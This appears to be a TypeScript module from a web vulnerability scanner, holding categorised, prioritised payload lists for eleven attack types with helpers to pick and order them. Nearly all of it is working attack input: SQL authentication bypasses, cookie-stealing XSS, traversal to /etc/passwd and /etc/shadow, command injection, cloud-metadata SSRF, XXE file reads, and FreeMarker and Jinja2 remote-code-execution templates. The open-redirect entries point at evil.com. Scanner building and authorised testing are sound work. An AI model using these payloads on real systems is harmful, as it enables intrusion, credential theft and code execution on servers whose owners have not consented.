import type { AttackType } from "@/types";

export interface PayloadEntry {
  value: string;
  description: string;
  category: "boolean" | "error" | "time" | "union" | "reflection" | "traversal" | "probe" | "injection" | "redirect" | "template";
  priority: number; // 1 = fast/light, 2 = medium, 3 = heavy/slow
}

// ─── Helper ───────────────────────────────────────────────────────────────────
function shuffle<T>(arr: T[]): T[] {
  const a = [...arr];
  for (let i = a.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [a[i], a[j]] = [a[j], a[i]];
  }
  return a;
}

function dedupe(payloads: PayloadEntry[]): PayloadEntry[] {
  const seen = new Set<string>();
  return payloads.filter((p) => {
    const key = p.value.trim().toLowerCase();
    if (seen.has(key)) return false;
    seen.add(key);
    return true;
  });
}

// ─── SQL Injection ────────────────────────────────────────────────────────────
const SQLI_PAYLOADS: PayloadEntry[] = dedupe([
  // Priority 1: fast error/boolean-based
  { value: "' OR '1'='1", description: "Classic boolean OR", category: "boolean", priority: 1 },
  { value: "' OR 1=1--", description: "Comment bypass", category: "boolean", priority: 1 },
  { value: "' OR 1=1#", description: "MySQL hash comment", category: "boolean", priority: 1 },
  { value: "' OR 'x'='x", description: "String comparison bypass", category: "boolean", priority: 1 },
  { value: "' OR '' = '", description: "Empty string comparison", category: "boolean", priority: 1 },
  { value: "1 AND 1=1", description: "Boolean true", category: "boolean", priority: 1 },
  { value: "1 AND 1=2", description: "Boolean false (diff check)", category: "boolean", priority: 1 },
  { value: "admin'--", description: "Auth bypass", category: "boolean", priority: 1 },
  { value: "test' AND '1'='1", description: "String AND comparison", category: "boolean", priority: 1 },
  // Encoded/obfuscated variants
  { value: "%27 OR 1=1--", description: "URL encoded quote bypass", category: "boolean", priority: 1 },
  { value: "'/**/OR/**/1=1--", description: "Comment obfuscation bypass", category: "boolean", priority: 1 },
  { value: "' oR '1'='1", description: "Case variation bypass", category: "boolean", priority: 1 },
  // Priority 2: error-based
  { value: "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--", description: "MySQL error-based version", category: "error", priority: 2 },
  { value: "' AND 1=CONVERT(int,@@version)--", description: "MSSQL version probe", category: "error", priority: 2 },
  { value: "1' AND 1=CAST((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1) AS INTEGER)--", description: "SQLite error-based", category: "error", priority: 2 },
  { value: "' UNION SELECT NULL,NULL,NULL--", description: "UNION enumeration", category: "union", priority: 2 },
  { value: "' UNION SELECT NULL,sqlite_version()--", description: "SQLite version probe", category: "union", priority: 2 },
  { value: "1' ORDER BY 1--", description: "Column count enumeration", category: "union", priority: 2 },
  { value: "1' ORDER BY 100--", description: "Column count overflow", category: "union", priority: 2 },
  // Priority 3: time-based (slow, run last)
  { value: "' AND SLEEP(5)--", description: "MySQL time-based blind", category: "time", priority: 3 },
  { value: "1; WAITFOR DELAY '0:0:5'--", description: "MSSQL time-based blind", category: "time", priority: 3 },
  { value: "' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--", description: "SQLite time-based blind", category: "time", priority: 3 },
]);

// ─── XSS ─────────────────────────────────────────────────────────────────────
const XSS_PAYLOADS: PayloadEntry[] = dedupe([
  // Priority 1: reflection probes
  { value: "<script>alert(1)</script>", description: "Basic script tag", category: "reflection", priority: 1 },
  { value: "<img src=x onerror=alert(1)>", description: "Image onerror", category: "reflection", priority: 1 },
  { value: "<svg onload=alert(1)>", description: "SVG onload", category: "reflection", priority: 1 },
  { value: '"onmouseover="alert(1)', description: "Attribute injection", category: "reflection", priority: 1 },
  { value: "<details open ontoggle=alert(1)>", description: "Details ontoggle", category: "reflection", priority: 1 },
  { value: "<body onload=alert(1)>", description: "Body onload", category: "reflection", priority: 1 },
  { value: "javascript:alert(1)", description: "JavaScript URI", category: "reflection", priority: 1 },
  // Encoded/obfuscated
  { value: "%3Cscript%3Ealert(1)%3C%2Fscript%3E", description: "URL encoded script tag", category: "reflection", priority: 1 },
  { value: "<scr\x00ipt>alert(1)</scr\x00ipt>", description: "Null byte bypass", category: "reflection", priority: 2 },
  { value: "<Script>alert(1)</Script>", description: "Case variation bypass", category: "reflection", priority: 1 },
  { value: "<<script>alert(1)//</script>", description: "Double bracket bypass", category: "reflection", priority: 2 },
  { value: "<iframe src=javascript:alert(1)>", description: "IFrame javascript", category: "reflection", priority: 2 },
  { value: "';alert(1)//", description: "Script context break", category: "reflection", priority: 2 },
  { value: "<script>prompt(document.cookie)</script>", description: "Cookie theft", category: "reflection", priority: 2 },
]);

// ─── Path Traversal ───────────────────────────────────────────────────────────
const PATH_TRAVERSAL_PAYLOADS: PayloadEntry[] = dedupe([
  { value: "../../../etc/passwd", description: "Unix passwd traversal", category: "traversal", priority: 1 },
  { value: "/etc/passwd", description: "Absolute path", category: "traversal", priority: 1 },
  { value: "/proc/self/environ", description: "Linux env vars", category: "traversal", priority: 1 },
  { value: "/proc/version", description: "Kernel version", category: "traversal", priority: 1 },
  { value: "/etc/shadow", description: "Shadow password file", category: "traversal", priority: 1 },
  // Encoded variants
  { value: "..%2F..%2F..%2Fetc%2Fpasswd", description: "URL encoded traversal", category: "traversal", priority: 2 },
  { value: "....//....//....//etc/passwd", description: "Double dot bypass", category: "traversal", priority: 2 },
  { value: "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", description: "Double URL encoded", category: "traversal", priority: 2 },
  { value: "..%252F..%252F..%252Fetc%252Fpasswd", description: "Double encoded slash", category: "traversal", priority: 2 },
  { value: "%c0%af..%c0%af..%c0%afetc/passwd", description: "UTF-8 overlong sequence", category: "traversal", priority: 2 },
  { value: "..///////..////..//////etc/passwd", description: "Multiple slash bypass", category: "traversal", priority: 2 },
  // Windows
  { value: "C:\\Windows\\system32\\drivers\\etc\\hosts", description: "Windows hosts file", category: "traversal", priority: 2 },
  { value: "..\\..\\..\\Windows\\system.ini", description: "Windows system.ini", category: "traversal", priority: 2 },
  { value: "../../boot.ini", description: "Windows boot.ini", category: "traversal", priority: 2 },
  { value: "....\\\\....\\\\etc/passwd", description: "Mixed slash bypass", category: "traversal", priority: 3 },
]);

// ─── Command Injection ────────────────────────────────────────────────────────
const CMD_INJECTION_PAYLOADS: PayloadEntry[] = dedupe([
  // Priority 1: fast output-based
  { value: "; whoami", description: "Current user (semicolon)", category: "injection", priority: 1 },
  { value: "| whoami", description: "Current user (pipe)", category: "injection", priority: 1 },
  { value: "& id", description: "User ID (ampersand)", category: "injection", priority: 1 },
  { value: "&& id", description: "User ID (double ampersand)", category: "injection", priority: 1 },
  { value: "`id`", description: "Backtick substitution", category: "injection", priority: 1 },
  { value: "$(id)", description: "Dollar substitution", category: "injection", priority: 1 },
  { value: "; ls -la", description: "List directory", category: "injection", priority: 1 },
  { value: "; cat /etc/passwd", description: "Read passwd", category: "injection", priority: 1 },
  { value: "| uname -a", description: "System info", category: "injection", priority: 1 },
  { value: "\n/bin/ls -al", description: "Newline injection", category: "injection", priority: 2 },
  { value: "; dir", description: "Windows dir listing", category: "injection", priority: 1 },
  { value: "| net user", description: "Windows net user", category: "injection", priority: 1 },
  // Priority 3: time-based
  { value: "; sleep 5", description: "Time-based (semicolon)", category: "time", priority: 3 },
  { value: "|| sleep 5", description: "Time-based OR", category: "time", priority: 3 },
  { value: "$(sleep 5)", description: "Dollar sleep", category: "time", priority: 3 },
  { value: "& ping -n 5 127.0.0.1", description: "Windows ping delay", category: "time", priority: 3 },
]);

// ─── SSRF ─────────────────────────────────────────────────────────────────────
const SSRF_PAYLOADS: PayloadEntry[] = dedupe([
  { value: "http://127.0.0.1/", description: "Localhost HTTP", category: "probe", priority: 1 },
  { value: "http://localhost/", description: "Localhost by name", category: "probe", priority: 1 },
  { value: "http://169.254.169.254/latest/meta-data/", description: "AWS meta-data", category: "probe", priority: 1 },
  { value: "http://169.254.169.254/", description: "AWS metadata root", category: "probe", priority: 1 },
  { value: "http://metadata.google.internal/", description: "GCP metadata", category: "probe", priority: 1 },
  { value: "http://192.168.0.1/", description: "Private 192.168.x.x", category: "probe", priority: 2 },
  { value: "http://10.0.0.1/", description: "Private 10.x.x.x", category: "probe", priority: 2 },
  { value: "http://172.16.0.1/", description: "Private 172.16.x.x", category: "probe", priority: 2 },
  { value: "http://[::1]/", description: "IPv6 loopback", category: "probe", priority: 2 },
  { value: "http://0177.0.0.1/", description: "Octal IP bypass", category: "probe", priority: 2 },
  { value: "http://2130706433/", description: "Decimal IP bypass", category: "probe", priority: 2 },
  { value: "http://0.0.0.0/", description: "Null route", category: "probe", priority: 2 },
  { value: "file:///etc/passwd", description: "File protocol", category: "probe", priority: 2 },
  { value: "dict://localhost:11211/", description: "Memcached probe", category: "probe", priority: 3 },
  { value: "gopher://127.0.0.1:6379/", description: "Redis gopher probe", category: "probe", priority: 3 },
]);

// ─── Open Redirect ────────────────────────────────────────────────────────────
const OPEN_REDIRECT_PAYLOADS: PayloadEntry[] = dedupe([
  { value: "https://evil.com", description: "Absolute URL redirect", category: "redirect", priority: 1 },
  { value: "//evil.com", description: "Protocol-relative redirect", category: "redirect", priority: 1 },
  { value: "/\\evil.com", description: "Backslash bypass", category: "redirect", priority: 1 },
  { value: "%2F%2Fevil.com", description: "URL encoded double slash", category: "redirect", priority: 1 },
  { value: "///evil.com", description: "Triple slash", category: "redirect", priority: 1 },
  { value: "https://evil.com%2F@target.com", description: "Credential confusion", category: "redirect", priority: 2 },
  { value: "javascript:alert(1)", description: "JavaScript protocol", category: "redirect", priority: 2 },
  { value: "data:text/html,<script>alert(1)</script>", description: "Data URI redirect", category: "redirect", priority: 2 },
  { value: "evil.com%0d%0aLocation:%20https://evil.com", description: "CRLF injection", category: "redirect", priority: 2 },
  { value: "https:evil.com", description: "Missing slash", category: "redirect", priority: 2 },
]);

// ─── XXE ──────────────────────────────────────────────────────────────────────
const XXE_PAYLOADS: PayloadEntry[] = dedupe([
  { value: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`, description: "Classic XXE file read", category: "injection", priority: 1 },
  { value: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]><foo>&xxe;</foo>`, description: "XXE SSRF AWS metadata", category: "injection", priority: 1 },
  { value: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]>`, description: "Parameter entity XXE", category: "injection", priority: 2 },
  { value: `<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>`, description: "XXE shadow file", category: "injection", priority: 2 },
  { value: `<!DOCTYPE test [<!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>`, description: "Base64 encoded XXE", category: "injection", priority: 3 },
]);

// ─── LDAP Injection ───────────────────────────────────────────────────────────
const LDAP_PAYLOADS: PayloadEntry[] = dedupe([
  { value: "*)(uid=*)(|(uid=*", description: "Wildcard filter bypass", category: "injection", priority: 1 },
  { value: "*)(|(password=*)", description: "Password filter bypass", category: "injection", priority: 1 },
  { value: "admin)(&)", description: "Admin AND bypass", category: "injection", priority: 1 },
  { value: "*)(objectClass=*", description: "ObjectClass enumerate", category: "injection", priority: 1 },
  { value: ")(|(cn=*))", description: "CN wildcard", category: "injection", priority: 2 },
  { value: "*(uid=*)(&", description: "AND filter bypass", category: "injection", priority: 2 },
  { value: "admin)(!(&(1=0)(cn=*))", description: "Complex LDAP bypass", category: "injection", priority: 2 },
  { value: "))(|(cn=*", description: "Parenthesis injection", category: "injection", priority: 2 },
  { value: "\\2a)(uid=*)(|(uid=\\2a", description: "Hex encoded asterisk", category: "injection", priority: 3 },
  { value: "*()|%26'", description: "Filter escape", category: "injection", priority: 3 },
]);

// ─── SSTI (Server-Side Template Injection) ────────────────────────────────────
const SSTI_PAYLOADS: PayloadEntry[] = dedupe([
  // Priority 1: probe (any engine)
  { value: "{{7*7}}", description: "Jinja2/Twig math probe (expect 49)", category: "template", priority: 1 },
  { value: "${7*7}", description: "FreeMarker/Velocity probe", category: "template", priority: 1 },
  { value: "<%= 7*7 %>", description: "ERB/EJS probe", category: "template", priority: 1 },
  { value: "#{7*7}", description: "Pebble/Ruby probe", category: "template", priority: 1 },
  { value: "*{7*7}", description: "Thymeleaf probe", category: "template", priority: 1 },
  { value: "@(7*7)", description: "Razor probe", category: "template", priority: 1 },
  // Priority 2: engine-specific confirmed
  { value: "{{7*'7'}}", description: "Jinja2 string multiply (expect 7777777)", category: "template", priority: 2 },
  { value: "${\"freemarker.template.utility.Execute\"?new()(\"id\")}", description: "FreeMarker RCE", category: "template", priority: 2 },
  { value: "{{config}}", description: "Jinja2 config dump", category: "template", priority: 2 },
  { value: "{{self.__dict__}}", description: "Jinja2 self dict", category: "template", priority: 2 },
  { value: "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", description: "Jinja2 RCE via builtins", category: "injection", priority: 3 },
]);

// ─── NoSQL Injection ──────────────────────────────────────────────────────────
const NOSQL_PAYLOADS: PayloadEntry[] = dedupe([
  // MongoDB operator injection (for JSON bodies / query params)
  { value: '{"$gt": ""}', description: "MongoDB $gt operator bypass", category: "boolean", priority: 1 },
  { value: '{"$ne": null}', description: "MongoDB $ne not-null bypass", category: "boolean", priority: 1 },
  { value: '{"$regex": ".*"}', description: "MongoDB regex wildcard", category: "boolean", priority: 1 },
  { value: '{"$where": "1==1"}', description: "MongoDB $where always true", category: "boolean", priority: 1 },
  { value: '{"$exists": true}', description: "MongoDB $exists probe", category: "boolean", priority: 1 },
  // URL param variants
  { value: "[$gt]=", description: "PHP/Node param operator $gt", category: "boolean", priority: 1 },
  { value: "[$ne]=invalid", description: "PHP/Node param $ne bypass", category: "boolean", priority: 1 },
  { value: "[$regex]=.*", description: "PHP/Node param regex", category: "boolean", priority: 1 },
  // Time-based
  { value: '{"$where": "sleep(5000)||this.x.match(/x/)"}', description: "MongoDB time-based blind", category: "time", priority: 3 },
]);

// ─── GraphQL Injection ────────────────────────────────────────────────────────
const GRAPHQL_PAYLOADS: PayloadEntry[] = dedupe([
  { value: "{__schema{types{name}}}", description: "Introspection query", category: "probe", priority: 1 },
  { value: '{"query":"{__schema{types{name}}}"}', description: "JSON introspection POST", category: "probe", priority: 1 },
  { value: "{__typename}", description: "Basic typename probe", category: "probe", priority: 1 },
  { value: '{user(id:"1 OR 1=1"){id name email}}', description: "GraphQL SQLi probe", category: "injection", priority: 2 },
  { value: '{user(id:"1\\"){id}}', description: "GraphQL string escape", category: "injection", priority: 2 },
  { value: "{users{id name email password}}", description: "Mass field enumeration", category: "probe", priority: 2 },
  { value: 'query{__type(name:"User"){fields{name type{name}}}}', description: "Type field enumeration", category: "probe", priority: 2 },
  { value: "{a:__typename b:__typename c:__typename}", description: "Alias flood probe", category: "probe", priority: 3 },
]);

// ─── Registry ─────────────────────────────────────────────────────────────────
export const PAYLOADS: Record<string, PayloadEntry[]> = {
  sqli: SQLI_PAYLOADS,
  xss: XSS_PAYLOADS,
  path_traversal: PATH_TRAVERSAL_PAYLOADS,
  cmd_injection: CMD_INJECTION_PAYLOADS,
  ssrf: SSRF_PAYLOADS,
  open_redirect: OPEN_REDIRECT_PAYLOADS,
  xxe: XXE_PAYLOADS,
  ldap: LDAP_PAYLOADS,
  ssti: SSTI_PAYLOADS,
  nosql: NOSQL_PAYLOADS,
  graphql: GRAPHQL_PAYLOADS,
};

export const ATTACK_TYPE_LABELS: Record<string, string> = {
  sqli: "SQL Injection",
  xss: "Cross-Site Scripting (XSS)",
  path_traversal: "Path Traversal",
  cmd_injection: "Command Injection",
  ssrf: "Server-Side Request Forgery",
  open_redirect: "Open Redirect",
  xxe: "XML External Entity (XXE)",
  ldap: "LDAP Injection",
  ssti: "Server-Side Template Injection",
  nosql: "NoSQL Injection",
  graphql: "GraphQL Injection",
};

export function getPayloads(attackType: AttackType, max: number): PayloadEntry[] {
  const all = PAYLOADS[attackType] ?? [];
  const deduped = dedupe(all);

  // Sort: priority 1 first (fast), then 2, then 3 (slow/heavy).
  // Within same priority, shuffle for variety.
  const p1 = shuffle(deduped.filter((p) => p.priority === 1));
  const p2 = shuffle(deduped.filter((p) => p.priority === 2));
  const p3 = shuffle(deduped.filter((p) => p.priority === 3));

  return [...p1, ...p2, ...p3].slice(0, max);
}
